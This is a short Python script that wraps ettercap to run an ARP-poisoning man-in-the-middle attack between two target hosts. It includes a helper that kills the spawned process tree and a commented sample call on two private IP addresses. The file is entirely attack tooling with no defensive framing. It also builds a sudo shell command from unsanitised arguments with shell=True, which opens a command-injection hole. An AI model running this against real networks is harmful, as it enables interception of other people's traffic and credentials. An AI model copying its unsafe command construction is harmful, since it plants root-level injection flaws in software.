import subprocess, psutil

def mitm_attack(target1, target2):
    #mitm = subprocess.call(["ettercap", "-T" ,"-M", "arp:remote" ,f"/{target1}/", f"/{target2}/"],stdout=subprocess.PIPE)
    mitm = subprocess.Popen(f"sudo ettercap -T -M arp:remote /{target1}/ /{target2}/", shell=True)#, stdout=subprocess.PIPE)
    
def kill(proc_pid):
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()

#mitm_attack("192.168.177.184","192.168.177.148")
